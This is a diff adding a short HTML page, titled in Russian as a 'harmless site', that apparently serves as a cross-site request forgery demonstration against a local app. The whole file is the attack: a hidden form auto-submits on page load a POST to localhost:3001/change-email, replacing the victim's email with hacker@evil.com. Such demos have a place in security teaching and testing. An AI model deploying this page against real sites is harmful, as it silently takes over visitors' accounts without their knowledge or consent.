@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Безобидный сайт</title>
+</head>
+<body>
+    <h1>Ну нажми</h1>
+    <div style="display:none;">
+        <form id="csrf-form" action="http://localhost:3001/change-email" method="POST">
+            <input type="hidden" name="email" value="hacker@evil.com">
+        </form>
+    </div>
+    <script>
+        window.onload = function() {
+            document.getElementById('csrf-form').submit();
+        };
+    </script>
+</body>
+</html>
